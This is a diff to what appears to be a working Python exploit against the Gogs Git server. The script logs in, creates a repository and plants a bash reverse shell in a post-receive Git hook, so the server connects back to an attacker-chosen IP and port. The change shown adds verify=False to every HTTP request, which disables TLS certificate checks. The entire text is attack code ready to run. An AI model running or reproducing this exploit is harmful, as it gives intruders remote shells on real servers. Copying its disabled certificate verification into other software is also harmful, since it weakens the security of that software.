@@ -47,11 +47,11 @@ ip,port=temp.split(':')
 # CSRF URL: http://192.168.200.224:8000
 def get_csrf(*args):
 	if (len(args)==1):
-		r=requests.get(f'{ssl}{server}',cookies=args[0])
+		r=requests.get(f'{ssl}{server}',cookies=args[0],verify=False)
 		csrf=re.findall(pattern,r.headers['set-cookie'])[0]
 		return csrf
 	else:
-		r=requests.get(f'{ssl}{server}')
+		r=requests.get(f'{ssl}{server}',verify=False)
 		csrf=re.findall(pattern,r.headers['set-cookie'])[0]
 		return csrf
 
@@ -62,7 +62,7 @@ def login():
 	# Session cookie being set before login
 	cookies=dict()
 	l_pattern = 'i_like_gogs=([a-zA-Z0-9\-\_=]+)'
-	r=requests.get(f'{ssl}{server}')
+	r=requests.get(f'{ssl}{server}',verify=False)
 	cookies['i_like_gogs']=re.findall(l_pattern,r.headers['set-cookie'])[0]
 	
 	data=dict()
@@ -70,9 +70,9 @@ def login():
 	data['user_name']=username
 	data['password']=password
 	
-	r=requests.post(f'{ssl}{server}/user/login',cookies=cookies,data=data)
+	r=requests.post(f'{ssl}{server}/user/login',cookies=cookies,data=data,verify=False)
 	
-	r=requests.get(f'{ssl}{server}',cookies=cookies)
+	r=requests.get(f'{ssl}{server}',cookies=cookies,verify=False)
 	
 	
 	print(f'{bcolors.OKGREEN}[+] Login successful as {username}.{bcolors.ENDC}')
@@ -82,7 +82,7 @@ def login():
 # Step 2: Create a Repository
 # http://192.168.200.224:8000/repo/create
 def repo(session):
-	r=requests.get(f'{ssl}{server}/repo/create',cookies=session)
+	r=requests.get(f'{ssl}{server}/repo/create',cookies=session,verify=False)
 	l_pattern = 'name="user_id" value="([0-9]+)"'
 	user_id=re.findall(l_pattern,r.text)[0]
 	
@@ -96,7 +96,7 @@ def repo(session):
 	data['gitignores']=''
 	data['license']=''
 	data['readme']='Default'
-	r=requests.post(f'{ssl}{server}/repo/create',cookies=session,data=data)
+	r=requests.post(f'{ssl}{server}/repo/create',cookies=session,data=data,verify=False)
 	print(f'{bcolors.OKGREEN}[+] Repository {repository} created.{bcolors.ENDC}')
 	
 	return repository
@@ -104,7 +104,7 @@ def repo(session):
 # Step 3: Creating a post commit git hook 'post-receive'
 # http://192.168.200.224:8000/admin/testrepo1/settings/hooks/git/post-receive
 def settings(session,repository):
-	r=requests.get(f'{ssl}{server}/{username}/{repository}/settings',cookies=session)
+	r=requests.get(f'{ssl}{server}/{username}/{repository}/settings',cookies=session,verify=False)
 	if 'git hooks' in r.text.lower():
 		print(f'{bcolors.OKGREEN}[+] User can create Git hooks.{bcolors.ENDC}')
 		
@@ -112,7 +112,7 @@ def settings(session,repository):
 		data['_csrf']=get_csrf(session)
 		revshell=f'#!/bin/bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1'
 		data['content']=revshell
-		r=requests.post(f'{ssl}{server}/{username}/{repository}/settings/hooks/git/post-receive',cookies=session,data=data)
+		r=requests.post(f'{ssl}{server}/{username}/{repository}/settings/hooks/git/post-receive',cookies=session,data=data,verify=False)
 		print(f'{bcolors.OKGREEN}[+] Reverse shell commands pasted in post-receive Git hook.{bcolors.ENDC}')
 		return 'True'
 	else:
